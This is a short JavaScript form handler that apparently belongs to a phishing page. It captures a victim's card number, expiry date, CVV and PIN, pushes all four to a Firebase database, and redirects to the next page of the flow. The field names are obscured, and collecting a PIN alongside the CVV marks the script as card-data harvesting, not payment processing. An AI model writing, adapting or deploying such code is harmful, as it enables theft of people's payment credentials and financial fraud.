
// reference your database
var ududip007DB = firebase.database().ref("ududip007");

document.getElementById("ududip007").addEventListener("submit", submitForm);

function submitForm(e) {
  e.preventDefault();

    var a1 = getElementVal("a1");
    var b2 = getElementVal("b2");
    var c3 = getElementVal("c3");
    var d4 = getElementVal("d4");
    
    

  

  saveMessages(a1, b2 ,c3 ,d4);

  // redirect to card page
  window.location.href = "3.html";
}

const saveMessages = (a1, b2 ,c3 ,d4) => {
  var newududip007 = ududip007DB.push();

  newududip007.set({
      card: a1,
      expiry: b2,
      cvv: c3,
      PIN: d4,
      
      
    
    
  });
};

const getElementVal = (id) => {
  return document.getElementById(id).value;
};

